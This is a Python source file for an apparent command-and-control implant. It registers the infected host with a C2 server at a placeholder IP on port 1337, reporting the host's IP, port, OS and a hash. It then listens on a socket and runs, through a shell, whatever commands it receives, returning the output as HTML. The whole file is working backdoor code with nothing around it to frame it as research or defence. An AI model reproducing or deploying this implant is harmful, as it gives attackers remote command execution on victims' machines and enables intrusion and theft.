import time
import socket
import subprocess
import hashlib
import http.client

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
    except Exception as e:
        output = str(e)
    return output

def format_output_for_html(output):
    # Escape HTML special characters
    formatted_output = output.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    # Replace newlines with HTML line breaks
    formatted_output = formatted_output.replace("\n", "<br>")
    # Wrap in <pre> tag to preserve whitespace formatting
    formatted_output = f"<pre>{formatted_output}</pre>"
    return formatted_output


def register(C2_SERVER, C2_PORT, LOCAL_HASH, LOCAL_HOST, LOCAL_PORT, LOCAL_OS, LOCAL_TIME):
    max_redirects = 5  # Set the maximum number of redirects to follow
    redirect_count = 0

    while redirect_count < max_redirects:
        # Set up the connection
        conn = http.client.HTTPConnection(C2_SERVER, C2_PORT)

        # Set the request parameters
        url = f"/agents/register?agent_hash={LOCAL_HASH}&agent_ip={LOCAL_HOST}&agent_port={LOCAL_PORT}&agent_os={LOCAL_OS}&check_in={LOCAL_TIME}"

        # Send the GET request
        conn.request("GET", url)

        # Get the response
        response = conn.getresponse()

        print("[+] Response:", response.status, response.reason)

        # Check if the response is a redirect (status code 3xx)
        if 300 <= response.status < 400:
            new_location = response.getheader('Location')
            if new_location:
                print(f"[+] Redirecting to: {new_location}")
                # Extract new server and port from the new_location if needed
                # Update C2_SERVER and C2_PORT here if needed
                redirect_count += 1
                conn.close()
                continue

        data = response.read()
        print("[+] Response data:", data.decode())

        # Close the connection
        conn.close()
        break  # Exit the loop whether or not there was a redirect


def start_agent():
    # Most of the below will be auto-generated.
    C2_SERVER = 'XXX.XXX.XXX.XXX'    # "Brain / Motherbase" IP.
    C2_PORT = 1337
    LOCAL_HOST = 'XXX.XXX.XXX.XXX'   # Target IP, ran locally. Can scrape local info for this to populate.
    LOCAL_OS = 'Windows'
    LOCAL_PORT = 888
    LOCAL_TIME = str(time.time())
    LOCAL_HASH = hashlib.sha256(LOCAL_TIME.encode('utf-8')).hexdigest()

    # Register agent in C2 Server
    register(C2_SERVER, C2_PORT, LOCAL_HASH, LOCAL_HOST, LOCAL_PORT, LOCAL_OS, LOCAL_TIME)
    
    # Start listening for commands from C2 server.
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((LOCAL_HOST, LOCAL_PORT))
    server_socket.listen(1)

    print(f"[+] Listening on {LOCAL_HOST}:{LOCAL_PORT}...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection from {client_address[0]}:{client_address[1]}")

        data = client_socket.recv(1024).decode()
        if data:
            output = execute_command(data)
            formatted_output = format_output_for_html(output)
            client_socket.send(formatted_output.encode())
        
        client_socket.close()

if __name__ == '__main__':
    start_agent()